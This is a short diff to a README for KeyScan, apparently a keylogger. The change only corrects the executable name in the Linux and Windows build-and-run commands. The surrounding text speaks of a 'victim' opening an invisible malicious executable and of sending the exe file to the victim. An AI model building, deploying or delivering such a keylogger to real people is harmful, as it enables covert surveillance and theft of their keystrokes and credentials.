@@ -39,12 +39,12 @@ When the victim opens the malicious executable file, the window will be invisibl
 git clone https://github.com/4anonz/KeyScan.git
 cd KeyScan
 g++ main.cpp -o keyscn
-./keyscan
+./keyscn
 ```
 # Installation on Windows
 ```
 g++ main.cpp -o keyscn.exe -lws2_32
-.\keyscan.exe
+.\keyscn.exe
 ```
 # Sending the exe file to the victim
 If you're working on Linux you need to install mingw for compiling C++ windows programs on linux.
